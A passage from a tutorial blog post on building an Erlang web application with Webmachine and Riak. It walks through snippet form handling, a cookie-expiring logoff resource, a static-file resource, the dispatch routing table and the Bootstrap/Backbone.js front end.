</span><span class='line'>  <span class="p">{</span><span class="n">true</span><span class="p">,</span> <span class="nv">NewReqData</span><span class="p">,</span> <span class="nv">State</span><span class="p">}.</span>
</span><span class='line'>
</span><span class='line'><span class="c">%% --------------------------------------------------------------------------------------</span>
</span><span class='line'><span class="c">%% Private Function Definitions</span>
</span><span class='line'><span class="c">%% --------------------------------------------------------------------------------------</span>
</span><span class='line'>
</span><span class='line'><span class="nf">to_snippet</span><span class="p">(</span><span class="nv">FormData</span><span class="p">,</span> <span class="nl">#state</span><span class="p">{</span><span class="n">key</span><span class="o">=</span><span class="nv">Key</span><span class="p">,</span> <span class="n">user_data</span><span class="o">=</span><span class="p">{</span><span class="nv">UserId</span><span class="p">,</span> <span class="p">_,</span> <span class="p">_,</span> <span class="p">_}})</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nv">Title</span> <span class="o">=</span> <span class="nn">proplists</span><span class="p">:</span><span class="n">get_value</span><span class="p">(</span><span class="s">&quot;title&quot;</span><span class="p">,</span> <span class="nv">FormData</span><span class="p">),</span>
</span><span class='line'>  <span class="nv">Left</span> <span class="o">=</span> <span class="nn">proplists</span><span class="p">:</span><span class="n">get_value</span><span class="p">(</span><span class="s">&quot;left&quot;</span><span class="p">,</span> <span class="nv">FormData</span><span class="p">),</span>
</span><span class='line'>  <span class="nv">Right</span> <span class="o">=</span> <span class="nn">proplists</span><span class="p">:</span><span class="n">get_value</span><span class="p">(</span><span class="s">&quot;right&quot;</span><span class="p">,</span> <span class="nv">FormData</span><span class="p">),</span>
</span><span class='line'>  <span class="nv">Snippet</span> <span class="o">=</span> <span class="nn">csd_snippet</span><span class="p">:</span><span class="n">to_snippet</span><span class="p">(</span><span class="nv">Title</span><span class="p">,</span> <span class="nv">Left</span><span class="p">,</span> <span class="nv">Right</span><span class="p">,</span> <span class="nv">UserId</span><span class="p">),</span>
</span><span class='line'>  <span class="nn">csd_snippet</span><span class="p">:</span><span class="n">set_key</span><span class="p">(</span><span class="nv">Snippet</span><span class="p">,</span> <span class="nv">Key</span><span class="p">).</span>
</span></code></pre></td></tr></table></div></figure>


<p>Processing the form is just the same as when we did it for votes. We tease the form apart into a dictionary and call our own <code>to_snippet</code> function which accesses the dictionary to get the important bits of the snippet detail. At the same time, it utilises the key and the Id of the user to create a proper snippet object, which is returned to the caller.</p>

<p>Once this has been done, the snippet is pushed into Riak and we return the new key of the snippet in plain text format back to the client. The reason I chose this approach was so that the JavaScript on the client could simply redirect to a URI based on that key. JSON parsing on the client isn&rsquo;t needed as a result.</p>

<p>With that done, we&rsquo;re down to the last resource modification before we wire up dispatches and cover the UI.</p>

<h2><a id="logging-off"></a>Logging off</h2>

<p>This isn&rsquo;t part of the core workflow but it&rsquo;s a nice feature to have as it makes the site feel a little more rounded/polished. We want users to be able to sign off if they want to. We need to be able to handle a <code>POST</code> without a body, and remove the user&rsquo;s authentication information cookie by forcing it to expire.</p>

<p>Firstly we need to make this slight adjustment in the <code>cookie</code> module like so:</p>

<figure class='code'><figcaption><span>apps/csd_web/src/cookie.erl (partial) </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="c">% ... snip ...</span>
</span><span class='line'>
</span><span class='line'><span class="nf">remove_auth</span><span class="p">(</span><span class="nv">ReqData</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="n">store_auth_cookie</span><span class="p">(</span><span class="nv">ReqData</span><span class="p">,</span> <span class="s">&quot;&quot;</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">).</span>
</span><span class='line'>
</span><span class='line'><span class="c">% ... snip ...</span>
</span><span class='line'>
</span><span class='line'><span class="nf">store_auth</span><span class="p">(</span><span class="nv">ReqData</span><span class="p">,</span> <span class="nv">Id</span><span class="p">,</span> <span class="nv">Name</span><span class="p">,</span> <span class="nv">Token</span><span class="p">,</span> <span class="nv">TokenSecret</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nv">Value</span> <span class="o">=</span> <span class="nn">mochiweb_util</span><span class="p">:</span><span class="n">quote_plus</span><span class="p">(</span><span class="n">encode</span><span class="p">(</span><span class="nv">Id</span><span class="p">,</span> <span class="nv">Name</span><span class="p">,</span> <span class="nv">Token</span><span class="p">,</span> <span class="nv">TokenSecret</span><span class="p">)),</span>
</span><span class='line'>  <span class="n">store_auth_cookie</span><span class="p">(</span><span class="nv">ReqData</span><span class="p">,</span> <span class="nv">Value</span><span class="p">,</span> <span class="mi">3600</span> <span class="o">*</span> <span class="mi">24</span> <span class="o">*</span> <span class="no">?AUTH_EXPIRY_DAYS</span><span class="p">).</span>
</span><span class='line'>
</span><span class='line'><span class="c">%% --------------------------------------------------------------------------------------</span>
</span><span class='line'><span class="c">%% Private Function Definitions</span>
</span><span class='line'><span class="c">%% --------------------------------------------------------------------------------------</span>
</span><span class='line'>
</span><span class='line'><span class="nf">store_auth_cookie</span><span class="p">(</span><span class="nv">ReqData</span><span class="p">,</span> <span class="nv">Value</span><span class="p">,</span> <span class="nv">Expiry</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nv">Options</span> <span class="o">=</span> <span class="p">[</span>
</span><span class='line'>    <span class="c">%{domain, &quot;codesmackdown.com&quot;},</span>
</span><span class='line'>    <span class="p">{</span><span class="n">max_age</span><span class="p">,</span> <span class="nv">Expiry</span><span class="p">},</span>
</span><span class='line'>    <span class="p">{</span><span class="n">path</span><span class="p">,</span> <span class="s">&quot;/&quot;</span><span class="p">},</span>
</span><span class='line'>    <span class="p">{</span><span class="n">http_only</span><span class="p">,</span> <span class="n">true</span><span class="p">}</span>
</span><span class='line'>  <span class="p">],</span>
</span><span class='line'>  <span class="nv">CookieHeader</span> <span class="o">=</span> <span class="nn">mochiweb_cookies</span><span class="p">:</span><span class="n">cookie</span><span class="p">(</span><span class="no">?AUTH_COOKIE</span><span class="p">,</span> <span class="nv">Value</span><span class="p">,</span> <span class="nv">Options</span><span class="p">),</span>
</span><span class='line'>  <span class="nn">wrq</span><span class="p">:</span><span class="n">merge_resp_headers</span><span class="p">([</span><span class="nv">CookieHeader</span><span class="p">],</span> <span class="nv">ReqData</span><span class="p">).</span>
</span><span class='line'>
</span><span class='line'><span class="c">% ... snip ...</span>
</span></code></pre></td></tr></table></div></figure>


<p>We&rsquo;ve created a helper function, <code>store_auth_cookie</code>, which does as it says. It stores an auth cookie in the response based on the given <code>Value</code> of the cookie and the <code>Expiry</code>. This used to be part of the <code>store_auth</code> function, but we&rsquo;ve pulled it out into a method that can be reused. The <code>store_auth</code> function now calls this function when creating the authentication cookie like we used to. We also make a call via the <code>remove_auth</code> function, which sets the body of the token to a blank string and sets the expiry to -1 which forces the cookie to expire immediately when it hits the browser.</p>

<p>With this out of the way, we need to expose a resource which invokes it. Here it is without the boring bits included.</p>

<figure class='code'><figcaption><span>apps/csd_web/src/csd_web_logoff_resource.erl (partial) </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="c">% ... snip ...</span>
</span><span class='line'>
</span><span class='line'><span class="nf">allowed_methods</span><span class="p">(</span><span class="nv">ReqData</span><span class="p">,</span> <span class="nv">State</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="p">{[</span><span class="n">&#39;POST&#39;</span><span class="p">],</span> <span class="nv">ReqData</span><span class="p">,</span> <span class="nv">State</span><span class="p">}.</span>
</span><span class='line'>
</span><span class='line'><span class="nf">process_post</span><span class="p">(</span><span class="nv">ReqData</span><span class="p">,</span> <span class="nv">State</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nv">NewReqData</span> <span class="o">=</span> <span class="nn">cookie</span><span class="p">:</span><span class="n">remove_auth</span><span class="p">(</span><span class="nv">ReqData</span><span class="p">),</span>
</span><span class='line'>  <span class="p">{</span><span class="n">true</span><span class="p">,</span> <span class="nv">NewReqData</span><span class="p">,</span> <span class="nv">State</span><span class="p">}.</span>
</span></code></pre></td></tr></table></div></figure>


<p>Simple right? Handle a <code>POST</code> in the usual fashion and remove the authentication token during processing. It doesnt&#8217; get easier than that.</p>

<h2><a id="serving-static-content"></a>Serving Static Content</h2>

<p>We&rsquo;re now at a point where we&rsquo;re going to be serving up some content straight from disk. This includes CSS files, JavaScript source files and HTML templates. There are a large number of ways in which we can do this.</p>

<p>For the sake of this blog series we&rsquo;re going to keep this functionality within the application. If this application were to make it to production, this approach wouldn&rsquo;t be used. As great as Webmachine is, serving static content at break-neck speeds isn&rsquo;t one of its strong points. Instead it would be better to use something which is good at this kind of thing. <a href="http://nginx.org/" title="Nginx">Nginx</a> is a good example, but there are many others.</p>

<p>The static file serving resource is not something that I wrote (though I&rsquo;ve tweaked it a bit). I blatantly purloined it from somewhere on the web (quite a while ago I might add) and I can no longer find a reference to it. If anyone out there recognises it, please let me know and I shall give proper kudos/credit to the original author.</p>

<p>This resource works, but I say again it&rsquo;s not something that should be used in production.  Here it is in its entirety.</p>

<figure class='code'><figcaption><span>apps/csd_web/src/csd_web_static_resource.erl </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="p">-</span><span class="ni">module</span><span class="p">(</span><span class="n">csd_web_static_resource</span><span class="p">).</span>
</span><span class='line'><span class="p">-</span><span class="ni">author</span><span class="p">(</span><span class="n">&#39;OJ Reeves &lt;oj@buffered.io&gt;&#39;</span><span class="p">).</span>
</span><span class='line'>
</span><span class='line'><span class="c">%% --------------------------------------------------------------------------------------</span>
</span><span class='line'><span class="c">%% API Function Exports</span>
</span><span class='line'><span class="c">%% --------------------------------------------------------------------------------------</span>
</span><span class='line'>
</span><span class='line'><span class="p">-</span><span class="ni">export</span><span class="p">([</span>
</span><span class='line'>    <span class="n">init</span><span class="o">/</span><span class="mi">1</span><span class="p">,</span>
</span><span class='line'>    <span class="n">allowed_methods</span><span class="o">/</span><span class="mi">2</span><span class="p">,</span>
</span><span class='line'>    <span class="n">resource_exists</span><span class="o">/</span><span class="mi">2</span><span class="p">,</span>
</span><span class='line'>    <span class="n">content_types_provided</span><span class="o">/</span><span class="mi">2</span><span class="p">,</span>
</span><span class='line'>    <span class="n">provide_content</span><span class="o">/</span><span class="mi">2</span><span class="p">,</span>
</span><span class='line'>    <span class="n">file_exists</span><span class="o">/</span><span class="mi">2</span>
</span><span class='line'>  <span class="p">]).</span>
</span><span class='line'>
</span><span class='line'><span class="c">%% --------------------------------------------------------------------------------------</span>
</span><span class='line'><span class="c">%% Required Includes</span>
</span><span class='line'><span class="c">%% --------------------------------------------------------------------------------------</span>
</span><span class='line'>
</span><span class='line'><span class="p">-</span><span class="ni">include_lib</span><span class="p">(</span><span class="s">&quot;webmachine/include/webmachine.hrl&quot;</span><span class="p">).</span>
</span><span class='line'><span class="p">-</span><span class="ni">include_lib</span><span class="p">(</span><span class="s">&quot;kernel/include/file.hrl&quot;</span><span class="p">).</span>
</span><span class='line'>
</span><span class='line'><span class="c">%% --------------------------------------------------------------------------------------</span>
</span><span class='line'><span class="c">%% Record definitions</span>
</span><span class='line'><span class="c">%% --------------------------------------------------------------------------------------</span>
</span><span class='line'>
</span><span class='line'><span class="p">-</span><span class="ni">record</span><span class="p">(</span><span class="nl">context</span><span class="p">,</span> <span class="p">{</span><span class="n">docroot</span><span class="p">,</span> <span class="n">fullpath</span><span class="p">,</span> <span class="n">fileinfo</span><span class="p">,</span> <span class="n">response_body</span><span class="p">}).</span>
</span><span class='line'>
</span><span class='line'><span class="c">%% --------------------------------------------------------------------------------------</span>
</span><span class='line'><span class="c">%% API Function Definitions</span>
</span><span class='line'><span class="c">%% --------------------------------------------------------------------------------------</span>
</span><span class='line'>
</span><span class='line'><span class="nf">init</span><span class="p">([</span><span class="nv">ContentDir</span><span class="p">])</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="p">{</span><span class="n">ok</span><span class="p">,</span> <span class="nv">App</span><span class="p">}</span><span class="o">=</span> <span class="nn">application</span><span class="p">:</span><span class="n">get_application</span><span class="p">(),</span>
</span><span class='line'>  <span class="nv">PrivDir</span> <span class="o">=</span> <span class="nn">code</span><span class="p">:</span><span class="n">priv_dir</span><span class="p">(</span><span class="nv">App</span><span class="p">),</span>
</span><span class='line'>  <span class="nv">SourceDir</span> <span class="o">=</span> <span class="nn">filename</span><span class="p">:</span><span class="n">join</span><span class="p">([</span><span class="nv">PrivDir</span><span class="p">,</span> <span class="nv">ContentDir</span><span class="p">]),</span>
</span><span class='line'>  <span class="p">{</span><span class="n">ok</span><span class="p">,</span> <span class="nl">#context</span><span class="p">{</span><span class="n">docroot</span><span class="o">=</span><span class="nv">SourceDir</span><span class="p">}}.</span>
</span><span class='line'>
</span><span class='line'><span class="nf">allowed_methods</span><span class="p">(</span><span class="nv">ReqData</span><span class="p">,</span> <span class="nv">Context</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="p">{[</span><span class="n">&#39;HEAD&#39;</span><span class="p">,</span> <span class="n">&#39;GET&#39;</span><span class="p">],</span> <span class="nv">ReqData</span><span class="p">,</span> <span class="nv">Context</span><span class="p">}.</span>
</span><span class='line'>
</span><span class='line'><span class="nf">resource_exists</span><span class="p">(</span><span class="nv">ReqData</span><span class="p">,</span> <span class="nv">Ctx</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="p">{</span><span class="n">true</span><span class="p">,</span> <span class="nv">ReqData</span><span class="p">,</span> <span class="nv">Ctx</span><span class="p">}.</span>
</span><span class='line'>
</span><span class='line'><span class="nf">content_types_provided</span><span class="p">(</span><span class="nv">ReqData</span><span class="p">,</span> <span class="nv">Ctx</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nv">Path</span> <span class="o">=</span> <span class="nn">wrq</span><span class="p">:</span><span class="n">disp_path</span><span class="p">(</span><span class="nv">ReqData</span><span class="p">),</span>
</span><span class='line'>  <span class="nv">Mime</span> <span class="o">=</span> <span class="nn">webmachine_util</span><span class="p">:</span><span class="n">guess_mime</span><span class="p">(</span><span class="nv">Path</span><span class="p">),</span>
</span><span class='line'>  <span class="p">{[{</span><span class="nv">Mime</span><span class="p">,</span> <span class="n">provide_content</span><span class="p">}],</span> <span class="nv">ReqData</span><span class="p">,</span> <span class="nv">Ctx</span><span class="p">}.</span>
</span><span class='line'>
</span><span class='line'><span class="nf">provide_content</span><span class="p">(</span><span class="nv">ReqData</span><span class="p">,</span> <span class="nv">Context</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="c">% if returns {true, NewContext} then NewContext has response_body</span>
</span><span class='line'>  <span class="k">case</span> <span class="nv">Context</span><span class="nl">#context.response_body</span> <span class="k">of</span>
</span><span class='line'>    <span class="n">undefined</span> <span class="o">-&gt;</span>
</span><span class='line'>      <span class="k">case</span> <span class="n">file_exists</span><span class="p">(</span><span class="nv">Context</span><span class="p">,</span> <span class="nn">wrq</span><span class="p">:</span><span class="n">disp_path</span><span class="p">(</span><span class="nv">ReqData</span><span class="p">))</span> <span class="k">of</span>
</span><span class='line'>        <span class="p">{</span><span class="n">true</span><span class="p">,</span> <span class="nv">FullPath</span><span class="p">}</span> <span class="o">-&gt;</span>
</span><span class='line'>          <span class="p">{</span><span class="n">ok</span><span class="p">,</span> <span class="nv">Value</span><span class="p">}</span> <span class="o">=</span> <span class="nn">file</span><span class="p">:</span><span class="n">read_file</span><span class="p">(</span><span class="nv">FullPath</span><span class="p">),</span>
</span><span class='line'>          <span class="p">{</span><span class="nv">Value</span><span class="p">,</span> <span class="nv">ReqData</span><span class="p">,</span> <span class="nv">Context</span><span class="nl">#context</span><span class="p">{</span><span class="n">response_body</span><span class="o">=</span><span class="nv">Value</span><span class="p">}};</span>
</span><span class='line'>        <span class="n">false</span> <span class="o">-&gt;</span>
</span><span class='line'>          <span class="p">{</span><span class="n">error</span><span class="p">,</span> <span class="nv">ReqData</span><span class="p">,</span> <span class="nv">Context</span><span class="p">}</span>
</span><span class='line'>      <span class="k">end</span><span class="p">;</span>
</span><span class='line'>    <span class="p">_</span><span class="nv">Body</span> <span class="o">-&gt;</span>
</span><span class='line'>      <span class="p">{</span><span class="nv">Context</span><span class="nl">#context.response_body</span><span class="p">,</span> <span class="nv">ReqData</span><span class="p">,</span> <span class="nv">Context</span><span class="p">}</span>
</span><span class='line'>  <span class="k">end</span><span class="p">.</span>
</span><span class='line'>
</span><span class='line'><span class="nf">file_exists</span><span class="p">(</span><span class="nv">Context</span><span class="p">,</span> <span class="nv">Path</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nv">FullPath</span> <span class="o">=</span> <span class="n">get_full_path</span><span class="p">(</span><span class="nv">Context</span><span class="p">,</span> <span class="nv">Path</span><span class="p">),</span>
</span><span class='line'>  <span class="k">case</span> <span class="nn">filelib</span><span class="p">:</span><span class="n">is_regular</span><span class="p">(</span><span class="nn">filename</span><span class="p">:</span><span class="n">absname</span><span class="p">(</span><span class="nv">FullPath</span><span class="p">))</span> <span class="k">of</span>
</span><span class='line'>    <span class="n">true</span> <span class="o">-&gt;</span>
</span><span class='line'>      <span class="p">{</span><span class="n">true</span><span class="p">,</span> <span class="nv">FullPath</span><span class="p">};</span>
</span><span class='line'>    <span class="n">false</span> <span class="o">-&gt;</span>
</span><span class='line'>      <span class="n">false</span>
</span><span class='line'>  <span class="k">end</span><span class="p">.</span>
</span><span class='line'>
</span><span class='line'><span class="nf">get_full_path</span><span class="p">(</span><span class="nv">Context</span><span class="p">,</span> <span class="nv">Path</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nv">Root</span> <span class="o">=</span> <span class="nv">Context</span><span class="nl">#context.docroot</span><span class="p">,</span>
</span><span class='line'>  <span class="nv">Result</span> <span class="o">=</span> <span class="k">case</span> <span class="nn">mochiweb_util</span><span class="p">:</span><span class="n">safe_relative_path</span><span class="p">(</span><span class="nv">Path</span><span class="p">)</span> <span class="k">of</span>
</span><span class='line'>    <span class="n">undefined</span> <span class="o">-&gt;</span>
</span><span class='line'>      <span class="n">undefined</span><span class="p">;</span>
</span><span class='line'>    <span class="nv">RelPath</span> <span class="o">-&gt;</span>
</span><span class='line'>      <span class="nv">FullPath</span> <span class="o">=</span> <span class="nn">filename</span><span class="p">:</span><span class="n">join</span><span class="p">([</span><span class="nv">Root</span><span class="p">,</span> <span class="nv">RelPath</span><span class="p">]),</span>
</span><span class='line'>      <span class="k">case</span> <span class="nn">filelib</span><span class="p">:</span><span class="n">is_dir</span><span class="p">(</span><span class="nv">FullPath</span><span class="p">)</span> <span class="k">of</span>
</span><span class='line'>        <span class="n">true</span> <span class="o">-&gt;</span>
</span><span class='line'>          <span class="nn">filename</span><span class="p">:</span><span class="n">join</span><span class="p">([</span><span class="nv">FullPath</span><span class="p">,</span> <span class="s">&quot;index.html&quot;</span><span class="p">]);</span>
</span><span class='line'>        <span class="n">false</span> <span class="o">-&gt;</span>
</span><span class='line'>          <span class="nv">FullPath</span>
</span><span class='line'>      <span class="k">end</span>
</span><span class='line'>  <span class="k">end</span><span class="p">,</span>
</span><span class='line'>  <span class="nv">Result</span><span class="p">.</span>
</span></code></pre></td></tr></table></div></figure>


<p>There&rsquo;s a lot here to cover, but most of it could be understood quit easily by following the code path.</p>

<p>To sum it up this is how it works. The resource is configured in the dispatch list and in that list a location is specified as a parameter. This location is the folder in which the files will be located. This value is passed into the <code>init</code> function so that the resource knows the root folder to search the files for.</p>

<p>When a request is made the resource attempts to guess the [MIME][] type based on the file extension using a built-in Mochiweb function. It then attempts to load the file from disk and if found it returns the file content as the body of the response.</p>

<p>With that out of the way, now is the perfect time to wire in all the new resources in the dispatch list.</p>

<h2><a id="updating-dispatch"></a>Updating Dispatch</h2>

<p>We need to modify our <code>app.config</code> which contains our dispatch list so that it correctly routes all the URIs to the appropriate resources. Let&rsquo;s take a look at the updated list</p>

<figure class='code'><figcaption><span>apps/csd_web/priv/app.config (partial) </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="c">% ... snip ...</span>
</span><span class='line'>
</span><span class='line'>  <span class="p">{</span><span class="n">csd_web</span><span class="p">,</span>
</span><span class='line'>    <span class="p">[</span>
</span><span class='line'>      <span class="p">{</span><span class="n">web</span><span class="p">,</span>
</span><span class='line'>        <span class="p">[</span>
</span><span class='line'>          <span class="c">% ... snip ...</span>
</span><span class='line'>          <span class="p">{</span><span class="n">dispatch</span><span class="p">,</span>
</span><span class='line'>            <span class="p">[</span>
</span><span class='line'>              <span class="p">{[],</span> <span class="n">csd_web_resource</span><span class="p">,</span> <span class="p">[]},</span>
</span><span class='line'>              <span class="p">{[</span><span class="s">&quot;css&quot;</span><span class="p">,</span> <span class="n">&#39;*&#39;</span><span class="p">],</span> <span class="n">csd_web_static_resource</span><span class="p">,</span> <span class="p">[</span><span class="s">&quot;www/static/css&quot;</span><span class="p">]},</span>
</span><span class='line'>              <span class="p">{[</span><span class="s">&quot;js&quot;</span><span class="p">,</span> <span class="n">&#39;*&#39;</span><span class="p">],</span> <span class="n">csd_web_static_resource</span><span class="p">,</span> <span class="p">[</span><span class="s">&quot;www/static/js&quot;</span><span class="p">]},</span>
</span><span class='line'>              <span class="p">{[</span><span class="s">&quot;views&quot;</span><span class="p">,</span> <span class="n">&#39;*&#39;</span><span class="p">],</span> <span class="n">csd_web_static_resource</span><span class="p">,</span> <span class="p">[</span><span class="s">&quot;www/static/views&quot;</span><span class="p">]},</span>
</span><span class='line'>              <span class="p">{[</span><span class="s">&quot;img&quot;</span><span class="p">,</span> <span class="n">&#39;*&#39;</span><span class="p">],</span> <span class="n">csd_web_static_resource</span><span class="p">,</span> <span class="p">[</span><span class="s">&quot;www/static/img&quot;</span><span class="p">]},</span>
</span><span class='line'>              <span class="p">{[</span><span class="s">&quot;snippet&quot;</span><span class="p">],</span> <span class="n">csd_web_snippet_submit_resource</span><span class="p">,</span> <span class="p">[]},</span>
</span><span class='line'>              <span class="p">{[</span><span class="s">&quot;snippet&quot;</span><span class="p">,</span> <span class="n">key</span><span class="p">],</span> <span class="n">csd_web_snippet_resource</span><span class="p">,</span> <span class="p">[]},</span>
</span><span class='line'>              <span class="p">{[</span><span class="s">&quot;vote&quot;</span><span class="p">],</span> <span class="n">csd_web_vote_submit_resource</span><span class="p">,</span> <span class="p">[]},</span>
</span><span class='line'>              <span class="p">{[</span><span class="s">&quot;userdetail&quot;</span><span class="p">,</span> <span class="n">user_id</span><span class="p">],</span> <span class="n">csd_web_user_detail_resource</span><span class="p">,</span> <span class="p">[]},</span>
</span><span class='line'>              <span class="p">{[</span><span class="s">&quot;logoff&quot;</span><span class="p">],</span> <span class="n">csd_web_logoff_resource</span><span class="p">,</span> <span class="p">[]},</span>
</span><span class='line'>              <span class="p">{[</span><span class="s">&quot;oauth&quot;</span><span class="p">,</span> <span class="s">&quot;request&quot;</span><span class="p">],</span> <span class="n">csd_web_request_resource</span><span class="p">,</span> <span class="p">[]},</span>
</span><span class='line'>              <span class="p">{[</span><span class="s">&quot;oauth&quot;</span><span class="p">,</span> <span class="s">&quot;callback&quot;</span><span class="p">],</span> <span class="n">csd_web_callback_resource</span><span class="p">,</span> <span class="p">[]}</span>
</span><span class='line'>            <span class="p">]}</span>
</span><span class='line'>        <span class="p">]</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>    <span class="p">]</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="c">% ... snip ...</span>
</span></code></pre></td></tr></table></div></figure>


<p>The first entry is as it was before, as are the last two. There are 4 routes which use <code>csd_web_static_resource</code> to handle different URIs that point to static files on disk. This allows us to have URIs like <code>"/js/csd.js"</code> and <code>"css/site.css"</code> without us having to add another path (such as <code>"/static/js/csd.js"</code> to each). All our static content has been placed under the <code>apps/csd_web/priv/</code> and each of the static routes is relative to this folder.</p>

<p>The rest of the routes map directly to handlers based on a common-sense URI which should now make sense based on what we&rsquo;ve implemented in this post.</p>

<p>All that we have left to discuss is the new, fandangled user interface.</p>

<h2><a href="user-interface"></a>User Interface</h2>

<p>I stand by what I said on Twitter..</p>

<blockquote><p>The problem with Twitter bootstrap is that everything
now looks like Twitter bootstrap.</p></blockquote>

<p>Despite this, I&rsquo;m using Twitter bootstrap for the UI because I&rsquo;m terrible at design and this was the easiest thing to use which makes me look non-terrible (though I&rsquo;m sure I may have managed to make bootstrap terrible too).</p>

<p>The goal of this series is to cover server-side programming of web applications using an Erlang technology stack. Heavy user-interface development is beyond the scope for this already lengthy blog post, so I won&rsquo;t be diving into the implementation. What I will say is:</p>

<ol>
<li>The front-end is quite JavaScript heavy and uses <a href="http://documentcloud.github.com/backbone/" title="Backbone.js">Backbone.js</a> to handle routing, models and view rendering.</li>
<li>URIs make use of the hashtag quite a bit so that links can still be used to access particular snippets directly.</li>
<li>For client-side template rendering I&rsquo;m using <a href="http://handlebarsjs.com/" title="Handlebars templating">Handlebars</a> which gives me really simple and relatively quick JavaScript template management.</li>
<li>Handlebar templates are loaded via ajax calls as required.</li>
<li><a href="http://www.jquery.com/" title="jQuery">jQuery</a> is used heavily. What a surprise.</li>
</ol>


